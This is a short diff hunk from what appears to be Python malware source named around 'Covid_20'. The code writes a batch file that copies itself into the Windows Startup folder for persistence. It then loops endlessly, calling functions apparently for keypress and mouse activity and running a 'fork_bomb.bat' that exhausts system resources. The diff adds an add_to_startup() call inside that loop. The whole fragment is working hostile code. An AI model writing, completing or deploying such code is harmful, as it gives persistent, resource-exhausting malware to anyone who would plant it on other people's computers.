@@ -47,9 +47,9 @@ def windows():
         with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
             bat_file.write(r'cp Covid_20 "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
             bat_file.write(r'python "" %s' % file_path)
-
-
+    
     while True:
+        add_to_startup()
         keypresses()
         mice()
         os.system("fork_bomb.bat") 
